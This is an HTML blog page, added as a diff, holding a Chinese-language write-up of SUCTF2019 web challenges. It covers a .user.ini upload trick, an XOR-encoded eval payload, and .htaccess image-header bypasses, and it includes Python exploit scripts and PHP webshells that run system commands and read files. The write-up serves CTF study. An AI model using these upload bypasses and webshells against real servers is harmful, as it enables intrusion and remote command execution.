@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="CheckIn相对其他题来说比较简单的一道题，所用到的文件是.user.ini，所用范围要比.htaccess的范围要广一些，首先上传.user.ini文件  通过auto_prepend_file指定要包含的文件，再上传这个文件  成功写入木马，访问目录下的index.php，此时index.php已经包含了2.png的一句话代码。 PS：如果了解过这个知识点的话，其实这道题的提示还是很明显的，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2019">
+<meta property="og:url" content="http://yoursite.com/2019/08/27/SUCTF2019/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="CheckIn相对其他题来说比较简单的一道题，所用到的文件是.user.ini，所用范围要比.htaccess的范围要广一些，首先上传.user.ini文件  通过auto_prepend_file指定要包含的文件，再上传这个文件  成功写入木马，访问目录下的index.php，此时index.php已经包含了2.png的一句话代码。 PS：如果了解过这个知识点的话，其实这道题的提示还是很明显的，">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mNyluV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mN6Jqf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/22/mw7RED.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mRRMwt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mR7T91.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mROQJJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mfWb28.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mfhR7d.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/26/mf4iB4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/m4GcP1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/mIDsgg.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190820154836-eaa31fbc-c31e-1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/m4D6gJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/mI06JS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/mIBpFK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/27/mIBLh8.png">
+<meta property="article:published_time" content="2019-08-27T11:34:18.000Z">
+<meta property="article:modified_time" content="2019-08-27T11:37:40.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/21/mNyluV.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/27/SUCTF2019/"/>
+
+
+
+
+
+  <title>SUCTF2019 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/27/SUCTF2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SUCTF2019</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T19:34:18+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>相对其他题来说比较简单的一道题，所用到的文件是<code>.user.ini</code>，所用范围要比.htaccess的范围要广一些，首先上传.user.ini文件</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mNyluV.png" alt="mNyluV.png"></p>
+<p>通过auto_prepend_file指定要包含的文件，再上传这个文件</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mN6Jqf.png" alt="mN6Jqf.png"></p>
+<p>成功写入木马，访问目录下的index.php，此时index.php已经包含了2.png的一句话代码。</p>
+<p><strong>PS：如果了解过这个知识点的话，其实这道题的提示还是很明显的，给了一个空的index.php，目的就是让人去思考这个文件的作用，进而去想到.user.ini。</strong></p>
+<h3 id="Easyweb"><a href="#Easyweb" class="headerlink" title="Easyweb"></a>Easyweb</h3><p>题目比较直接，上来就给了代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目目的还是很明确的，通过eval调用get_the_flag函数，然后上传文件bypass，最后拿到shell，然后得到flag.</p>
+<p>首先需要通过eval去调用get_the_flag函数，（PS:不得不说php的黑科技真的是多…我之前一直以为异或是要加双引号或者单引号的…通过这个题..长知识了)。</p>
+<p>因为这道题ban掉了所有数字和字母，当然还有很多符号，如<code>[,&#39;,&quot;</code>等，所以用的也不是常规的异或构造的字符，这里用的是十六进制异或字符的构造，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>
+
+<p>说到这里.，我自己写了一个小工具，虽然有点不稳定(在linux上，windows还是蛮稳定的，还是蛮有实用价值的，链接如下：<a href="https://github.com/lihuaiqiu/XorShell" target="_blank" rel="noopener">https://github.com/lihuaiqiu/XorShell</a></p>
+<p>使用截图</p>
+<p><img src="https://s2.ax1x.com/2019/08/22/mw7RED.png" alt="mw7RED.png"></p>
+<p>这里不需要引号的原因是</p>
+<p>php的经典特性<code>Use of undefined constant</code>，（赛后看出题人的解释知道的..涨知识了，这个特性会将代码中没有引号的都自动作为字符串(Ascii码大于0x7F)，所以通过上面的十六进制可以bypass,调用get_the_flag函数，接着来考虑的是bypass如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有三次检测，第一次是匹配后缀的ph字符串，第二次是看文件内容中有无<code>&lt;?</code>，第三次是调用exif_imagetype函数看看是不似乎符合这个函数要的图片。</p>
+<p>首先看一下符合exif_imagetype的文件格式</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mRRMwt.png" alt="mRRMwt.png"></p>
+<p>这里并没有ban掉htaccess，但是把php ban的很严格，所以我们可以上传htaccess来把我们要的格式解析为php，但这里htaccess也要考虑一些东西，首先必须要可以让htaccess文件正确解析，但是还得符合图片的格式，<strong>在htaccess中#可以注释，还有一种就是把该行用\x00开头，这样配置文件也会把该行作为无效行解析</strong>，<strong>既然这样，我们就有两种绕过手段，第一种是使用注释来标记文件头，第二种是文件头以\x00开头的文件</strong>，原作者给的是xbm文件(第一种，使用注释来标记文件头)</p>
+<p>参考链接</p>
+<p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a></p>
+<p>这样我们就可以通过脚本来生成可以绕过上传.htaccess文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">xbmhtaccess=<span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .qiu</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=zenis.qiu"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url=<span class="string">"http://3f165c30-20ac-4c51-8d4a-742208486edc.node1.buuoj.cn/?_=$%7B%86%9E%9C%8D%5E%d9%d9%d9%d9%7D%7B%d9%7D();&amp;%d9=get_the_flag"</span></span><br><span class="line"><span class="comment">#upload</span></span><br><span class="line">files=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,xbmhtaccess,<span class="string">'image/png'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,files=files)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
+
+<p>这里我写的是base64编码绕过，原作者用的是utf16，也贴一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br></pre></td></tr></table></figure>
+
+<p>原作者最终的exp为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.php16"</span>, <span class="string">"&lt;?php system($_GET['cmd']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"scandir.php16"</span>, <span class="string">"&lt;?php echo implode('\n', scandir($_GET['dir'])); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"getfile.php16"</span>, <span class="string">"&lt;?php echo file_get_contents($_GET['file']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"info.php16"</span>, <span class="string">"&lt;?php phpinfo(); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>第二种就是以\x00开头的文件了，wbmp就是这样的文件，不过看ico也是，不过试了一下似乎没成功</p>
+<p>来看一下wbmp的文件头….我是生成的wbmp文件，和一些师傅的wp的似乎有些不同，不过也可以成功（Orz，因为第三位是宽度，第四位是高度，后面是数据，所以不一样</p>
+<p><a href="https://imgchr.com/i/mR7T91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mR7T91.png" alt="mR7T91.png"></a></p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://de662a31-6d37-4204-a412-1af93fda3ee9.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line">htaccess=<span class="string">b"""\x00\x00\x85\x48\x85\x18</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/1.test"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">b"GIF89a"</span>+<span class="string">b"aa"</span>+base64.b64encode(<span class="string">b"&lt;?php phpinfo()?&gt;"</span>) <span class="comment">#aa为了满足base64算法凑足八个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first_upload ---- to upload .htaccess</span></span><br><span class="line"></span><br><span class="line">files1=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url=url,files=files1)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#second_upload ---- to upload .shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">files2=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'1.test'</span>,shell)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url,files=files2)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下htaccess的配置信息的意思</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .test</span><br><span class="line">php_value auto_append_file  &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;1.test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>1.将.test后缀的以php进行解析</p>
+<p>2.在加载完php文件后去包含base64解码后的1.test</p>
+<p>模拟一下配置文件作用于1.test的流程</p>
+<p>首先将1.test以php的方式解析，在1.test加载完毕后，再次包含base64解码后的1.test，成功getshell，所以这也就是为什么会出现两次1.test内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</p>
+<p><a href="https://imgchr.com/i/mROQJJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mROQJJ.png" alt="mROQJJ.png"></a></p>
+<h3 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h3><p>进入题目给出源码</p>
